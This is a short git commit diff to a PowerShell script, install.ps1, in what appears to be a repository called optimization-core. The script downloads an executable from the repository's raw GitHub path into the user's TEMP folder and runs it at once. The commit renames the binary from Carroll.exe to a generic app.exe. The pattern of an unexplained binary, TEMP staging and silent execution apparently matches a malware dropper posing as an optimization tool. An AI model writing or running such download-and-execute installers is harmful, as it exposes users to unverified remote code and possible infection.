8ea219159b6397e324b844143caf6e669776c22f
optimization-core <badswater@gmail.com>
2026-04-29 10:01:22 +0300

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,7 +1,5 @@
-$url = "https://github.com/optimization-core/optimization/raw/main/Carroll.exe"
-
-$dest = "$env:TEMP\Carroll.exe"
+$url = "https://github.com/optimization-core/optimization/raw/main/app.exe"
+$dest = "$env:TEMP\app.exe"
 
 Invoke-WebRequest $url -OutFile $dest
-
 Start-Process $dest
